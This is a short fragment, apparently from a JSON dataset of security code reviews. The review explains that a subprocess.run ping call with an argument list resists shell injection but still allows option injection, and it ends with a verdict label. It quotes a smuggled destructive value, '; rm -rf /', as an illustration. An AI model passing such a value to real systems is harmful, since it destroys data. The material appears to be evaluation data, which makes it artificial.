+   "This is **not vulnerable to classic shell command injection** because `subprocess.run()` is called with an argument list and `shell=True` is not used, so shell metacharacters in `host` like `; rm -rf /` are passed literally to `ping`.\n\nHowever, if `host` is attacker-controlled, it can still be an **argument/option injection** risk: values beginning with `-` may be interpreted by `ping` as additional options rather than as a hostname. Safer code should validate `host` as a hostname/IP and/or use an end-of-options marker where supported:\n\n```python\nsubprocess.run([\"ping\", \"-c\", \"1\", \"--\", host], check=True)\n```\n\nVERDICT: VULNERABLE"
   ]
  ]
 }
